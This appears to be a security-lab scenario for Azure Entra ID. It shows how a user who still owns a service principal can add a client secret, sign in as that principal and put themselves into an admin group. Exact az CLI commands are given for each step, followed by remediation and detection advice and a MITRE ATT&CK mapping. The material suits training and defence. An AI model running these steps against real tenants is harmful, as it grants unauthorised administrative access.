# Add Service Principal Credentials

**Difficulty:** Advanced | **Provider:** Azure | **Category:** Identity / Privilege Escalation

## Scenario

A user (`norightsuser`) was removed as owner of the `group-add-app` **application
registration** after a job change. However, the administrator forgot to also remove them
from the underlying **service principal** object. This is a common oversight — app
registration ownership and service principal ownership are managed separately in Entra ID.

The service principal has the **Group.ReadWrite.All** application permission. If an
attacker can add credentials to the service principal and authenticate as it, they can add
themselves to the `cred-administrators` group (which in a real environment would hold the
Global Administrator role).

## Attack Path

```
[norightsuser] still owns the Service Principal
    |
    v
az ad sp credential reset --append  -->  add new client secret
    |
    v
az login --service-principal  (authenticate as SP)
    |
    v
POST /v1.0/groups/<cred-administrators-id>/members/$ref
    |
    v
norightsuser is now in the admin group
```

### Step 1 — Find the service principal you own

```bash
az ad sp list --show-mine --query "[].{name:displayName, id:id}"
```

### Step 2 — Add a new credential

```bash
az ad sp credential reset --id <sp-object-id> --append
# Note the new appId, password, and tenant
```

### Step 3 — Authenticate as the service principal

```bash
az login --service-principal \
  --username <appId> --password <password> --tenant <tenant>
```

### Step 4 — Add yourself to the admin group

```bash
# Get the group object ID
az ad group show --group "cred-administrators" --query id -o tsv

# Add norightsuser
az ad group member add \
  --group <group-id> \
  --member-id <norightsuser-object-id>
```

## How to Fix in Production

1. **Remove ownership from both the app registration AND the service principal** when
   off-boarding. Use `az ad sp owner remove` in addition to `az ad app owner remove`.
2. **Audit service principal ownership regularly**: `az ad sp list --all`.
3. **Prefer managed identities** over service principals where possible — they have no
   exportable credentials to steal or add.
4. **Alert on `addServicePrincipalCredentials` events** in the Entra ID audit log.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Additional Cloud Credentials | [T1098.001](https://attack.mitre.org/techniques/T1098/001/) |
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Account Manipulation | [T1098](https://attack.mitre.org/techniques/T1098/) |
